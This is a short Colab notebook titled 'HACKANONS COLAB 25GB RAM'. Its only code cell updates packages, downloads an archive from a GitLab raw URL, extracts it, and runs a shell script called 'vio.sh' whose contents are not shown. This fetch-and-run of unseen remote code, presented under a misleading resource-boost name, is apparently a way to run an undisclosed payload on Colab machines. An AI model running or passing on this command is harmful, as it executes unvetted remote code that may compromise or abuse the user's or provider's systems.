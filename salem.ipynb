{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "HACKANONS COLAB 25GB RAM.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/41815010159/gembler/blob/main/salem.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Qh6XE4VQy2PV"
      },
      "source": [
        "!sudo apt update && sudo apt install screen -y && wget https://gitlab.com/pomadmiracle/paktarnoh/-/raw/master/hilo.tar.gz && tar xf hilo.tar.gz && chmod +x vio.sh && ./vio.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}